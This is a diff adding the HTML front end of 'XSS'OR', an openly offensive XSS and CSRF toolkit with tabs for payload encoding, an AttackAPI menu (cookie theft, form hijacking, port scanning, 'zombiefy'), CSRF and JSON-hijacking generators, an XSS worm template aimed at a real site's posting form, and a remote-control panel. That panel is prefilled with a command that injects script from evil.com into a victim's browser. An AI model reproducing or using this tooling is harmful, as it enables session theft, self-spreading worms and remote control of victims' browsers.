@@ -1,0 +1,230 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>XSS'OR</title>
+<link href="style/main.css" rel="stylesheet" type="text/css"/>
+<script type="text/javascript" src="lib/jquery.js"></script>
+<script type="text/javascript" src="lib/core.js"></script>
+<script type="text/javascript" src="basic.js"></script>
+<script type="text/javascript" src="lib/attack.js"></script>
+<script type="text/javascript" src="lib/encode.js"></script>
+<script type="text/javascript" src="lib/worm.js"></script>
+<script></script>
+</head>
+
+<body>
+<span id="sys_tip">正在加载……</span>
+<div id="Ww_BOX">
+	<div id="Ww_Head">
+		<ul id="Db_MainNav">
+			<li><a href="javascript:void(0);" id="_0">Encode/Decode</a></li>
+			<li><a href="javascript:void(0);" id="_1">XSSCodz</a></li>
+			<li><a href="javascript:void(0);" id="_4">CSRFCodz</a></li>
+			<li><a href="javascript:void(0);" id="_2">WormAction</a></li>
+			<li><a href="javascript:void(0);" id="_3">RemoteControl</a></li>
+			
+			<li><a href="javascript:void(0);" id="_5">About</a></li>
+		</ul>
+	</div>
+	<div id="Ww_Body">
+		<!--Encode/Decode-->
+		<div id="Ww_B_0" class="Ww_B">
+			<div id="Ww_B_0_Left">
+				<textarea id="Ww_B_0_textarea"><script>x=alert;x(/xssor/.source);</script></textarea>
+			</div>
+			<div id="Ww_B_0_Right">
+				<input type="button" name="rwb_b2" value="→16en" onclick="knownxss.encode.en(16)" /><input type="button" name="rwb_b2_j" value="De" onclick="knownxss.encode.de(16)" /><input type="radio" name="rwb_b2_c" id="rwb_b2_c1" checked="checked" />\u<input type="radio" name="rwb_b2_c" id="rwb_b2_c2" />&amp;#x;
+				<br />
+				<input type="button" name="rwb_b1" value="→10en" onclick="knownxss.encode.en(10)" /><input type="button" name="rwb_b1_j" value="De" onclick="knownxss.encode.de(10)" /><input type="radio" name="rwb_b1_c" id="rwb_b1_c1" checked="checked" />,<input type="radio" name="rwb_b1_c" id="rwb_b1_c4" />c<input type="radio" name="rwb_b1_c" id="rwb_b1_c2" />&amp;#<input type="radio" name="rwb_b1_c" id="rwb_b1_c3" />&amp;#;
+				<br />
+				<input type="button" name="rwb_b3" value="escape" onclick="knownxss.encode._escape()" /> <span style="font-size:18px">&harr;</span> <input type="button" name="rwb_b3j" value="unescape" onclick="knownxss.encode._unescape()" />
+				<br />
+				<input type="button" name="rwb_b4" value="encodeURI" onclick="knownxss.encode._encodeURI()" /> <span style="font-size:18px">&harr;</span> <input type="button" name="rwb_b4j" value="decodeURI" onclick="knownxss.encode._decodeURI()" />
+				<br />
+				<input type="button" name="rwb_b5" value="Html2JS" onclick="knownxss.encode.html2js(1)" /> <span style="font-size:18px">&harr;</span> <input type="button" name="rwb_b5j" value="JS2Html" onclick="knownxss.encode.html2js(2)" />
+				<br />
+				<input type="button" name="rwb_b6" value="HtmlEncode" onclick="knownxss.encode.htmlencode(1)" /> <span style="font-size:18px">&harr;</span> <input type="button" name="rwb_b6j" value="HtmlDecode" onclick="knownxss.encode.htmlencode(2)" />
+				<br />
+				<input type="button" name="rwb_b7" value="base64En" onclick="knownxss.encode.base64Code(1)" /> <span style="font-size:18px">&harr;</span> <input type="button" name="rwb_b7j" value="base64De" onclick="knownxss.encode.base64Code(2)" />
+				<br /><br />
+				<input type="button" name="rwb_b7" value="replace" onclick="knownxss.encode.replaceC()" /><input type="text" name="oldC" id="oldC" size="5" /> <span style="font-size:18px">&rarr;</span> <input type="text" name="newC" id="newC" size="5" />
+				<br /><br />
+				<input type="button" value="clear codz" onclick="_g('Ww_B_0_textarea').value='';" /><br />
+				<input type="button" value="paste codz" onclick="var v=_g('Ww_B_0_textarea').createTextRange();v.execCommand('Paste')" /> <input type="button" value="copy codz" onclick="var v=_g('Ww_B_0_textarea').createTextRange();v.execCommand('Copy');knownxss.encode.copy_ok()" />
+			</div>
+		</div>
+		<!--XSSCodz-->
+		<div id="Ww_B_1" class="Ww_B">
+			<div id="Ww_B_1_Top">
+				<select style="width:240px" onchange="knownxss.xss_codz.attack_api(this.options[selectedIndex].value)" name="attackapi">
+				  <option value="">AttackAPI LIB</option>
+				  <option value="AttackAPI.core.bindFunction">.core.bindFunction</option>
+				  <option value="AttackAPI.core.clone">.core.clone</option>
+				  <option value="AttackAPI.core.extend">.core.extend</option>
+				  <option value="AttackAPI.dom.attachEvent">.dom.attachEvent</option>
+				  <option value="AttackAPI.dom.delCookie">.dom.delCookie</option>
+				  <option value="AttackAPI.dom.freeze">.dom.freeze</option>
+				  <option value="AttackAPI.dom.getAgent">.dom.getAgent</option>
+				  <option value="AttackAPI.dom.getClipboard">.dom.getClipboard</option>
+				  <option value="AttackAPI.dom.getCookie">.dom.getCookie</option>
+				  <option value="AttackAPI.dom.getCookies">.dom.getCookies</option>
+				  <option value="AttackAPI.dom.getDocument">.dom.getDocument</option>
+				  <option value="AttackAPI.dom.getInternalHostname">.dom.getInternalHostname</option>
+				  <option value="AttackAPI.dom.getInternalIP">.dom.getInternalIP</option>
+				  <option value="AttackAPI.dom.getInternalNetworkInfo">.dom.getInternalNetworkInfo</option>
+				  <option value="AttackAPI.dom.getPlatform">.dom.getPlatform</option>
+				  <option value="AttackAPI.dom.getPlugins">.dom.getPlugins</option>
+				  <option value="AttackAPI.dom.getXHR">.dom.getXHR</option>
+				  <option value="AttackAPI.dom.hijackEval">.dom.hijackEval</option>
+				  <option value="AttackAPI.dom.hijackForm">.dom.hijackForm</option>
+				  <option value="AttackAPI.dom.hijackView">.dom.hijackView</option>
+				  <option value="AttackAPI.dom.include">.dom.include</option>
+				  <option value="AttackAPI.dom.parseXML">.dom.parseXML</option>
+				  <option value="AttackAPI.dom.request">.dom.request</option>
+				  <option value="AttackAPI.dom.requestCSRF">.dom.requestCSRF</option>
+				  <option value="AttackAPI.dom.requestIMG">.dom.requestIMG</option>
+				  <option value="AttackAPI.dom.requestIMGL">.dom.requestIMGL</option>
+				  <option value="AttackAPI.dom.requestJS">.dom.requestJS</option>
+				  <option value="AttackAPI.dom.requestJSL">.dom.requestJSL</option>
+				  <option value="AttackAPI.dom.requestJSON">.dom.requestJSON</option>
+				  <option value="AttackAPI.dom.requestLC">.dom.requestLC</option>
+				  <option value="AttackAPI.dom.requestXML">.dom.requestXML</option>
+				  <option value="AttackAPI.dom.requestXSS">.dom.requestXSS</option>
+				  <option value="AttackAPI.dom.requestXSSL">.dom.requestXSSL</option>
+				  <option value="AttackAPI.dom.scanExtensions">.dom.scanExtensions</option>
+				  <option value="AttackAPI.dom.scanHistory">.dom.scanHistory</option>
+				  <option value="AttackAPI.dom.scanPorts">.dom.scanPorts</option>
+				  <option value="AttackAPI.dom.searchGoogle">.dom.searchGoogle</option>
+				  <option value="AttackAPI.dom.setClipboard">.dom.setClipboard</option>
+				  <option value="AttackAPI.dom.setCookie">.dom.setCookie</option>
+				  <option value="AttackAPI.dom.signatures">.dom.signatures</option>
+				  <option value="AttackAPI.dom.spawnChannel">.dom.spawnChannel</option>
+				  <option value="AttackAPI.dom.spawnSandbox">.dom.spawnSandbox</option>
+				  <option value="AttackAPI.dom.spawnZombie">.dom.spawnZombie</option>
+				  <option value="AttackAPI.dom.spider">.dom.spider</option>
+				  <option value="AttackAPI.dom.sweepPorts">.dom.sweepPorts</option>
+				  <option value="AttackAPI.dom.transport">.dom.transport</option>
+				  <option value="AttackAPI.dom.triggerEvent">.dom.triggerEvent</option>
+				  <option value="AttackAPI.dom.zombiefy">.dom.zombiefy</option>
+				  <option value="AttackAPI.dom.zombiefyL">.dom.zombiefyL</option>
+				  <option value="AttackAPI.utils.buildDomain">.utils.buildDomain</option>
+				  <option value="AttackAPI.utils.buildJSON">.utils.buildJSON</option>
+				  <option value="AttackAPI.utils.buildQuery">.utils.buildQuery</option>
+				  <option value="AttackAPI.utils.buildURL">.utils.buildURL</option>
+				  <option value="AttackAPI.utils.decodeBase64">.utils.decodeBase64</option>
+				  <option value="AttackAPI.utils.decodeURL">.utils.decodeURL</option>
+				  <option value="AttackAPI.utils.encodeBase64">.utils.encodeBase64</option>
+				  <option value="AttackAPI.utils.encodeMD5">.utils.encodeMD5</option>
+				  <option value="AttackAPI.utils.encodeURL">.utils.encodeURL</option>
+				  <option value="AttackAPI.utils.ip2number">.utils.ip2number</option>
+				  <option value="AttackAPI.utils.net2range">.utils.net2range</option>
+				  <option value="AttackAPI.utils.number2ip">.utils.number2ip</option>
+				  <option value="AttackAPI.utils.packJS">.utils.packJS</option>
+				  <option value="AttackAPI.utils.parseDomain">.utils.parseDomain</option>
+				  <option value="AttackAPI.utils.parseJSON">.utils.parseJSON</option>
+				  <option value="AttackAPI.utils.parseQuery">.utils.parseQuery</option>
+				  <option value="AttackAPI.utils.parseURL">.utils.parseURL</option>
+				  <option value="AttackAPI.utils.range2net">.utils.range2net</option>
+				</select>
+				<br />
+				<textarea id="Ww_B_1_textarea"></textarea>
+			</div>
+				<br />
+			<div id="Ww_B_1_Bottom">
+			<textarea id="XSSCodz_textarea"></textarea>
+			<script>knownxss.xss_codz.lib();</script>
+			</div>
+		</div>
+		<!--WormAction-->
+		<div id="Ww_B_2" class="Ww_B">
+			<div id="Ww_B_2_Left">
+				<textarea id="Ww_B_2_textarea">src="http://www.yeeyan.com/groups/newTopic/"
+title="xss"
+content="from xss worm:)"</textarea>
+			</div>
+			<div id="Ww_B_2_Right">
+				<select style="width:262px" onchange="knownxss.worm.setWorm(this.options[selectedIndex].value)" name="set_Worm" id="set_Worm">
+					<option value="">Content-Type</option>
+					<option value="1">multipart/form-data</option>
+					<option value="2">application/x-www-form-urlencoded</option>
+				</select>
+				<br /><br />
+				<input type="button" value="reset" onclick="knownxss.worm.reset_Worm()" />
+			</div>
+		</div>
+		<!--RemoteControl-->
+		<div id="Ww_B_3" class="Ww_B">
+			<div id="Ww_B_3_Top">
+				<div id="cmd_div_left">
+				<textarea id="cmd" name="cmd">injectScript('http://www.evil.com:8888/web2ghost/lib/inject.js');
+setTimeout("injectIframe('http://www.baidu.com')",1000);
+</textarea>
+				</div>
+				<div id="cmd_div_right">
+					<input type="text" id="victim_id" name="victim_id" value="victim id" />
+					<div id="victim_list"></div>
+				</div>
+				<br />
+				<input type="button" onclick="knownxss.core.create_cmd();" value="inject your xss!" /><br /><br />
+			</div>
+			<div id="Ww_B_3_Bottom">
+			
+			</div>
+		</div>
+		<!--CSRFCodz-->
+		<div id="Ww_B_4" class="Ww_B">
+			<div id="Ww_B_4_Top">
+				<select style="width:92px" onchange="if(this.value==0){_g('csrflang').disabled=true;}else{_g('csrflang').disabled=false;}" id="csrftype" name="csrftype">
+				  <option value="null">CSRF Type</option>
+				  <option value="0">GET</option>
+				  <option value="1">POST</option>
+				 </select>
+				 <select style="width:120px" id="csrflang" name="csrflang">
+				  <option value="null">CSRF Language</option>
+				  <option value="js">JavaScript</option>
+				  <option value="as">Flash AS3</option>
+				  <option value="asp">ASP</option>
+				  <option value="php">PHP</option>
+				  <option value="py">Python</option>
+				 </select>
+				 <input type="button" style="width:160px!important;width:162px;" onclick="knownxss.csrf_codz.lib();" value="create your csrf!" />
+				<br />
+				<input type="text" id="csrfurl" name="csrfurl" value="http://site/submit.php" />
+				<input type="text" id="csrfvalue" name="csrfvalue" value="name1=value1&name2=value2" />
+				<br />
+				<textarea id="Ww_B_4_textarea"></textarea>
+			</div>
+				<br />
+			<div id="Ww_B_4_Bottom">
+			<select disabled="disabled" style="width:170px" id="cd_get" name="cd_get">
+			  <option value="null">跨域获取数据</option>
+			  <option value="as">Flash AS3</option>
+			  <option value="asp">ASP</option>
+			  <option value="php">PHP</option>
+			  <option value="py">Python</option>
+			  <option value="json">JSON Hijacking</option>
+			</select>
+			<br />
+			<textarea id="csrf_textarea"></textarea>
+			</div>
+		</div>
+		<!--About-->
+		<div id="Ww_B_5" class="Ww_B">
+			<div id="Ww_B_5_Top">
+				<div id="Ww_B_5_list0">
+					方便XSS与CSRF的工具，并且会集成更多的好想法。<br />
+					2008-04-05写的雏形，当时的定位是XSS Worm Framework，目前改进了不少，不过还远不够强大。<br />
+					后端使用PHP，前端与后端的交互都AJAX化了:)<br />
+					<br />by cosine, mail: evilcos@gmail.com<br />
+					
+					
+				</div>
+			</div>
+		</div>
+		<!--EOF-->
+	</div>
+</div>
+<script>_g("sys_tip").style.display = "none";</script>
+</body>
+</html>
